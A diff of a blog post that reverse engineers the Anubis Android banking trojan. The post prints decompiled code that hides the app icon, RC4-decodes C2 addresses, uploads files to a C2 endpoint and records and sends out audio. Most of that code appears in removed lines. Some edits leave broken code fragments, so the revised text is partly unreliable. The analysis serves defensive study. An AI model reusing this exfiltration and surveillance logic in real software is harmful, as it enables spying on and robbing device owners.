@@ -9,11 +9,10 @@ tags: ["reverse-engineering", "android", "malware"]
 
 # Intro
 
-Anubis is a pretty big banking trojan that targets android devices. Its first appearance dates back to 2016.
-And anubis is reported to have keylogging capabilities, sms spam, GPS tracking and many other scary stuff, of course, 
-other than stealing your banking information.
+Anubis is a pretty big banking trojan that targets android devices. // more stuff
 
 In this blog post, i will poke various parts of the malware while reverse engineering it to understand how it works and how to defeat it.
+
 
 # Samples 
 
@@ -238,7 +237,7 @@ here is the result.
 
 ![detecting obfuscation](/img/anubis/anubis_proguard.png)
 
-from that, we can conclude that this sample is obfuscated using **ProGuard**. 
+from that, we can conclude that this sample is obfuscated using ProGuard. 
 
 There are few projects that are capable of deobfuscating ProGuard. dex-oracle, simplify
 are two of such projects. However the goal here is not to deobfuscate the class names, variable names, and methods, but to deobfuscate constants and strings
@@ -327,8 +326,6 @@ rxOred-aspiree :: Analysis/android/anubis »
 ```
 Then, using jadx, we can analyse the code.  
 
-### MainActivity
-
 ```java
 /* renamed from: wocwvy.czyxoxmbauu.slsa.ncec.myvbo */
 public class MainActivity extends Activity {
@@ -355,7 +352,7 @@ public class MainActivity extends Activity {
 
 In the MainActivity, it declares some variables, including `banking_apps` of type `class BankingApps`. (which i reversd before coming to this hehe :3).
 
-onCreate method then check whether if `consts.f388o` is false (which is initially false, and defined in `Constants` class) or `Build.VERSION.SDK_INT` is less than **19**.
+onCreate method then check whether if `consts.f388o` is false (which is initially false, and defined in `Constants` class) or `Build.VERSION.SDK_INT` is less than 19.
 
 if yes, it creates the service `jtfxlnc`, else (if const.f388o is true or Build.VERSION.SDK_INT >= 19),
 it creates a `WebView`, enable javascript and load the url specified in `consts.f389p`. then it 
@@ -386,7 +383,7 @@ Then we can see an interesting piece of code in the MainActivity after the if el
 According to Android developers, `setComponentEnabledSetting` 'sets te enabled setting fot a package component (activity, reciever, service, provider). this setting will override any enabled state which may have been set by the component manifest'
 
 Here, MainActivity calls above API for itself, with constant 2 as the second argument. which is stands for  `COMPONENT_ENABLED_STATE_DISABLED`.
-In short terms, malware basically **hides its icon from the launcher** (by disabling) to make it harder for a regular user to delete the application.
+In short terms, malware basically hides its icon from the launcher (by disabling) to make it harder for a regular user to delete the application.
 All this makes sense because, this is why malware has started a service to run in the background.
 
 then there's a try catch block
@@ -508,7 +505,7 @@ However we see some interesting stuff in the above snippet.
 
 for example, when the method is called with `url` as an argument, it returns `https://cdnjs.sv`.
 
-and we can also see that the method is called with `keylogger` as the argument, which gives us a hint that this malware is **capable of keylogging**.
+and we can also see that the method is called with `keylogger` as the argument, which gives us a hint that this malware is capable of keylogging.
 
 ```sh
 [!] callback -> [*] method called SomeHttpClass.getSharedPreference("interval") => return: 10000
@@ -517,7 +514,7 @@ and we can also see that the method is called with `keylogger` as the argument, 
 be used when the condition fails. 
 
 So what exactly `SomeHttpClass.getSharedPreference()` does? Well, I think its reading data from some kind of data storage using the `key`
-which it recieves as an argument. Yaeee?? what comes to your mind?? **shared preferences**.
+which it recieves as an argument. Yaeee?? what comes to your mind?? shared preferences!!!.
 
 To confirm our assumption
 
@@ -678,8 +675,6 @@ Interceptor.attach(Module.findExportByName(null, "open"), {
 
 However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
 the xml.
-
-### Http, C2s and Endpoints
 
 Since we have already analyzed few methods from the `SomeHttpClass`, It's time to dig deep into it.
 
@@ -846,7 +841,7 @@ we see a while, loop which iterates until variable `i` is grater than or equal t
 the string returned from the previous operation is stored in str and then it has been asigned to `str2`. `str3` is assigned with  `BankingApps.f333t[i]`.
 then `str` is reassigned to itself with its every `BankingApps.f333t[i]` character being replaced with `BankingApps.f332s[i]`, if that makes sense.
 
-So its basically a loop that iterates through two arrays of characters, replacing one array's character in the string `str` with the other ones corresponding character.
+So its basically a loop that iterates through two arrays of characters, replacing one array's character in the string `str` with the other ones correspondingcharacter.
 
 Lets take a look at what those arrays are...
 
@@ -870,7 +865,8 @@ After the loop, `str` is reassigned to the return value of `SomeHttpClass.mo230d
     }
 ```
 
-Alright i guess this is how this malware got its name :). anyways, this method does nothing but calling another method with our string and `zanubis` as an arguments. And i think we should trace it with frida.
+Alright i guess this is how this malware got its name :). anyways, this method does nothing but calling another method with our string and `zanubis` as an 
+arguments. And i think we should trace it with frida.
 
 ```javascript
 'use strict';
@@ -910,148 +906,28 @@ It seems like `MakeTwitterRequest` is not the only function that calls `SomeHttp
 
 ```xml
 <string name="urls">ZWViZGQ3NjRjOGZlOWNjMjAzODhhNzFhNzg4MDJi&#10;    </string>
+
 ```
-and the return value is a url. `http://cdnjs.su`, it is the same url that we met when we were analyzing 
-`SomeHttpClass.mo234e` with frida, which will return after its been decoded if we request `url` key from the shared 
-preference. So my assumption on `SomeHttpClass.mo226c` being a decoder function is true!
+and the return value is a url. `http://cdnjs.su`, it is the same url that we met when we were analyzing `SomeHttpClass.mo234e` with frida, which will 
+return after its been decoded if we request `url` key from the shared preference. So my assumption on `SomeHttpClass.mo226c` being a decoder function is true!
 
 Since the web request that malware returns an empty string, we get nothing decoded :(.
 
-take a look at `SomeHttpClass.mo226c`.
-
-```java
-    public String mo226c(String str, String str2){
-        try {
-            return new String(new C0063a(str2.getBytes()).mo358a(mo223b(new String(Base64.decode(str, 0), "UTF-8"))));
-        } catch (Exception unused) {
-            return "";
-        }
-    }
-```
-So it does look like this function is not only a decoder but also a decrypter. Let's take a look at class `C0063a`.
-
-```
-public class C0063a {
-
-    [... code here]
-
-    public C0063a(byte[] bArr) {
-        this.f485a = m305c(bArr);
-    }
-```
-`C0063a` constructor calls another method.
-
-```java
-    private int[] m305c(byte[] key) {
-        int[] iArr = new int[256];
-        for (int i = 0; i < 256; i++) {
-            iArr[i] = i;
-        }
-        int i2 = 0;
-        for (int i3 = 0; i3 < 256; i3++) {
-            i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
-            swap(i3, i2, iArr);
-        }
-        return iArr;
-    }
-
-```
-
-So what this does is, creates an int array of size 256, fill it with numbers from 0 - 255, loop through 0 - 255 and
-do below expression 
-
-        i2 = (((i2 + iArr[i3]) + key[i3 % key.length]) + 256) % 256;
-
-well this looks like rc4 algorithm. swap function is pretty simple.
-
-then the array is returned and following method is applied on it by the `SomeHttpClass.mo226c` method. 
-
-```java
-    private int[] m305c(byte[] bArr) {
-        int[] iArr = new int[256];
-        for (int i = 0; i < 256; i++) {
-            iArr[i] = i;
-        }
-        int i2 = 0;
-        for (int i3 = 0; i3 < 256; i3++) {
-            i2 = (((i2 + iArr[i3]) + bArr[i3 % bArr.length]) + 256) % 256;
-            swap(i3, i2, iArr);
-        }
-        return iArr;
-    }
-```
-
-aand this confirms the assumption that this malware uses **rc4 algorithm**. However, unlike many other malware, anubis seems to use a **hardcoded key**, rather than generating a key on the fly, which is `zanubis`.
-
 As a summery what `MakeTwitterRequest` does is, 
 
-        - sends a requests to the url `https://twitter.com/qweqweqwe`, which contains tweets in chinese.
+        - makes a requests to the url `https://twitter.com/qweqweqwe`.
         - read the response html in to a buffer and remove all the spaces.
         - save the string in between `苏尔的开始`, `苏尔苏尔完` of the response html in `str`.
         - for each chinese character in `str`, replace it with a corresponding alphanumerical character (which results in a base64 encoded string).
-        - decode base64 encoded string in `str` and decrypt it using RC4, with key being equal to `zanubis` 
-        - store return value back in `str`.
+        - decode what's in `str` and save it back in `str`.
 
-However we dont really know what malware expects from the reponse html and what is the use of decoded and decrypted data. But i suspect main purpose of this snippet is to extract **C2 server addresses from the tweets of the user**. 
-
+However we dont really know what malware expects from the reponse html and what is the use of decoded data.
 Now we can move onto another interesting methods of the `SomeHttpClass`. 
 
-```java
-    public String mo218b(Context context, String str, String str2) {
-        C0067b bVar = new C0067b();
-        String str3 = "";
-        if (str.equals("1")) {
-            str3 = "/o1o/a3.php";
-        }
-        if (str.equals("2")) {
-            str3 = "/o1o/a4.php";
-        }
-        if (str.equals("3")) {
-            str3 = "/o1o/a5.php";
-        }
-        if (str.equals("4")) {
-            str3 = "/o1o/a6.php";
-        }
-        if (str.equals("5")) {
-            str3 = "/o1o/a7.php";
-        }
-        if (str.equals("6")) {
-            str3 = "/o1o/a8.php";
-        }
-        if (str.equals("7")) {
-            str3 = "/o1o/a9.php";
-        }
-        if (str.equals("10")) {
-            str3 = "/o1o/a10.php";
-        }
-        if (str.equals("11")) {
-            str3 = "/o1o/a11.php";
-        }
-        if (str.equals("12")) {
-            str3 = "/o1o/a12.php";
-        }
-        if (str.equals("13")) {
-            str3 = "/o1o/a13.php";
-        }
-        if (str.equals("14")) {
-            str3 = "/o1o/a14.php";
-        }
-        if (str.equals("15")) {
-            str3 = "/o1o/a15.php";
-        }
-        try {
-            String e = getSharedPreference(context, "url");
-            return bVar.mo363a(e + str3, str2);
-        } catch (Exception unused) {
-            mo213a("ERROR", "Class nwtdtqovhkgkna, POST -> URL");
-            return null;
-        }
-    }
-```
-
 
 ```java
-public void mo211a(Context context, String str, String str2, String str3) { 
+public void mo211a(Context context, String str, String str2, String str3) {
+        /* 
         String e = getSharedPreference(context, "websocket");
         StringBuilder sb = new StringBuilder();
         sb.append(e);
@@ -1071,9 +947,9 @@ well if we grep that part out from the xml,
 ```
 it's empty. Well my guess is that this will be filled later by the malware.
 
-then `sb` is appended with `/o1o/a1.php`, which is a **php endpoint**, and the resulting string (url) is stored in `sb2`. 
+then `sb` is appended with `/o1o/a1.php` and the resulting string (url) is stored in `sb2`. 
 
-```java
+```
         File file = new File(str);
         byte[] a = ReadFile(file);
         if (str2.equals("")) {
@@ -1097,10 +973,10 @@ Now let's take a look at `SomeHttpClass.mo247q`.
     }
 ```
 
-So its clear that this function is simply is getting the **SSAID** of the current user/app. 
+So its clear that this function is simply is getting the SSAID of the current user/app. 
 However, if it is failed to extract this information, it creates a unique ID by adding 35 to the remainders of various IDs when they are divided by 10. 
 
-My assumption is that, malware might be using this **SSAID to keep a track on devices**.
+My assumption is that, malware might be using this information to keep a track on devices.
 
 
 ```java 
@@ -1114,7 +990,7 @@ My assumption is that, malware might be using this **SSAID to keep a track on de
 ```
 
 in the above snippet, method `SomeHttpClass.mo211a` creates a new HttpURLConnection to the url stored in `sb2`. then it modifies some attributes of the Http
-Connection. for example, it first sets `UseCaches` to false, `DoOutput` to true and `RequestMethod` to `"POST"`, and it suggests that the request method this method is going to use is "POST". It also sets RequestProperties like, `"Connection"` to `"Keep-Alive"`, `"Cache-Control"` to `"no-cache"` and `"Content-Type"` to `"multipart/form-data;boundary=*****"`
+Connection. for example, it first sets `UseCaches` to false, `DoOutput` to true and `RequestMethod` to `"POST"`. It also sets RequestProperties like, `"Connection"` to `"Keep-Alive"`, `"Cache-Control"` to `"no-cache"` and `"Content-Type"` to `"multipart/form-data;boundary=*****"`
 
 ```java
         DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
@@ -1122,203 +998,13 @@ Connection. for example, it first sets `UseCaches` to false, `DoOutput` to true 
         StringBuilder sb3 = new StringBuilder();
         sb3.append("Content-Disposition: form-data; name=\"serverID\"");
         sb3.append("\r\n");
-        dataOutputStream.writeBytes(sb3.toString());
-        dataOutputStream.writeBytes("\r\n");
-
 ```
 
 then it creates a `DataOutputStream` out from the HttpURLConnection it created before. then it writes following string to the output stream.
 
 `--*****\r\n`
 
-another StringBuilder is created named `sb3` and the string 
-
-    "Content-Disposition: form-data; name=\"serverID\""\r\n" 
-
-is appended to it. then `sb3` is converted into a string and written to the output steam it opened before.
-
-```java
-        dataOutputStream.write("getfiles".getBytes());
-        dataOutputStream.writeBytes("\r\n");
-        dataOutputStream.writeBytes("--" + "*****" + "--" + "\r\n");
-```
-
-then following strings 
-
-    getfiles\r\n
-    --*****--\r\n
-
-```java
-        StringBuilder sb4 = new StringBuilder();
-        sb4.append("--");
-        sb4.append("*****");
-        sb4.append("\r\n");
-        dataOutputStream.writeBytes(sb4.toString());
-```
-
-then again, 
-
-    --****\r\n
-
-is written.
-
-```java
-        dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"" + str3 + "\";filename=\"" + str2 + "\"" + "\r\n");
-        dataOutputStream.writeBytes("\r\n");
-        dataOutputStream.write(a);
-        dataOutputStream.writeBytes("\r\n");
-        dataOutputStream.writeBytes("--" + "*****" + "--" + "\r\n");
-        dataOutputStream.flush();
-        dataOutputStream.close();
-```
-
-here its writing some strings to the output stream again first one being
-
-"Content-Disposition: form-data; name=\"" + str3 + "\";filename=\"" + str2 + "\"" + "\r\n\r\n",
-
-aaaaand guess what is next? the file it read earlier, which stored in byte array `a`.
-From that, it can be concluded that this method is doing some data exfiltration work.
-
-then again, it writes another string to the output stream.
-
-    --*****--\r\n
-
-and then output stream is flushed and closed. 
-
-Well then what are those weird strings and what is the file? well i think those are some kind of markers to indicate end and start of the stream. maybe im wrong. who knows.
-
-```java
-        BufferedInputStream bufferedInputStream = new BufferedInputStream(httpURLConnection.getInputStream());
-        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
-        StringBuilder sb5 = new StringBuilder();
-        while (true) {
-            String readLine = bufferedReader.readLine();
-            if (readLine != null) {
-                sb5.append(readLine);
-                sb5.append("\n");
-            } else {
-                bufferedReader.close();
-                mo213a("HTTP", "HTTPRESPONSE: " + sb5.toString());
-                bufferedInputStream.close();
-                httpURLConnection.disconnect();
-                return;
-            }
-        }
-    }
-```
-
-at the end of the method, we can see it creates an input stream out of the http connection, as well as a buffer reader. 
-then a StringBuilder is also declared. 
-
-the loop will continue until the local `readline` is not equal to null. and if so, it appends StringBuilder with the line that just read.
-
-else, it closes both BufferedReader and BufferedInputStream and disconnects the HttpURLConnection.
-
-
-let's scan the decompiled code to indentify cross references so we can get an idea about which files will be sent to the endpoint. (I renamed the method to `SendFileToEndpoint` so that it makes more sense :3 )
-
-![cross references](/img/anubis/anubis_crossreferences.png)
- 
-### Audio Recording
-
-and if we click one those cross references, we'll end up inside a runnable thread.
-
-```java
-    public void mo417a(final Context context, final String str, final int i) {
-        final MediaRecorder mediaRecorder = new MediaRecorder();
-        this.cls.mo213a("SOUND", "START RECORD SOUND");
-        this.f523b = false;
-        mediaRecorder.setAudioSource(1);
-        mediaRecorder.setOutputFormat(3);
-        mediaRecorder.setAudioEncoder(1);
-        mediaRecorder.setOutputFile(str);
-```
-
-Well this looks scary but yeah. we see a **MediaRecorder** is being initialized. then it starts recording sound and set AudioSource to **AMR_NB**, OutputFormat to **AMR_NB**, AudioEncoder to **AMR_NB** and OutputFile to `str`, which is the second parameter.
-
-```java
-        Thread thread = new Thread(new Runnable() {
-
-            public void run() {
-                SomeHttpClass bVar;
-                String str;
-                StringBuilder sb;
-```
-
-this is the runnable thread part i talked above. here it does nothing other than declaring some variables.
-
-```java
-                try {
-                    Thread.sleep((long) (i * 1000));
-                    AudioRecord.this.cls.mo213a("SOUND", "STOP RECORD SOUND");
-                    try {
-                        mediaRecorder.stop();
-                        mediaRecorder.release();
-                        AudioRecord.this.f523b = true;
-                        Log.e("FILE", "" + str);
-                        AudioRecord.this.cls.SendFileToEndpoint(context, str, "", "sound[]");
-                    } catch (Exception e) {
-                        e = e;
-                        bVar = AudioRecord.this.cls;
-                        str = "ERROR";
-                        sb = new StringBuilder();
-                        sb.append("Record Sound! ");
-                        sb.append(e);
-                        bVar.mo213a(str, sb.toString());
-                    }
-```
-
-inside the try block, we can it calls Thread.sleep for i * 1000, where `i` is the third parameter.
-we see another call `SomeHttpClass.mo213a` but this time with `"STOP RECORD SOUND"` as the second argument (compared to the previous call's second argument being "START RECORD SOUND"). So it looks like the function starts recording audio, sleep for user (in this case programmer) specified time and stop recording.
-
-then there's try block inside the try block, which basically stops the mediaRecorder and release it. then it sets some boolean variable to true, i guess which is responsible to tracking if it is still recording audio or not (and im gonna rename it to something that makes more sense). 
-
-then we see what we ve been expecting to see, the cross references. it passes `str` as the second argument (filename) and an empty string and `sound[]` as third and fouth arguments.
-
-inside the catch block, it just creates a string containing the error and pass it to `SomeHttpClass.mo213a`.
-
-```java
-                } catch (InterruptedException unused) {
-                    AudioRecord.this.cls.mo213a("SOUND", "STOP RECORD SOUND");
-                    try {
-                        mediaRecorder.stop();
-                        mediaRecorder.release();
-                        AudioRecord.this.f523b = true;
-                        Log.e("FILE", "" + str);
-                        AudioRecord.this.cls.SendFileToEndpoint(context, str, "", "sound[]");
-                    } catch (Exception e2) {
-                        e = e2;
-                        bVar = AudioRecord.this.cls;
-                        str = "ERROR";
-                        sb = new StringBuilder();
-                        sb.append("Record Sound! ");
-                        sb.append(e);
-                        bVar.mo213a(str, sb.toString());
-                    }
-
-                    [... another catch block that does the same thing]
-                }
-            }
-        });
-```
-
-`SomeHttpClass.mo213a` is called with the same argument as the try block. Inside it, theres another try catch block, both do the same thing as the previous try block.
-
-
-same applies to this block too...
-
-```java
-        try {
-            mediaRecorder.prepare();
-            mediaRecorder.start();
-            thread.start();
-        } catch (IOException unused) {
-        }
-    }
-```
-
-this is the block that actually starts the thread :).
-Soo what this method actually does is, it starts recording audio on the given source, waits until `i` amount of time and stops recording. then it calls our `SomeHttpClass.SendFileToEndpoint` method to send it to an endpoint so attacker can recieve the file.
+I guess this is some kind of a initialization command. maybe for a C2 server.
 
 Lets get an idea of how this malware gets banking applications.
 
@@ -1412,6 +1098,3 @@ when the iteration is finished, it checks if `str` contains following names.
     - com.paypal.android.p2pmobile
     - com.amazon.mShop.android.shopping
     - com.ebay.mobile
-
-if it does, it replaces the name with an empty string and append the name to the end of `str`.
-
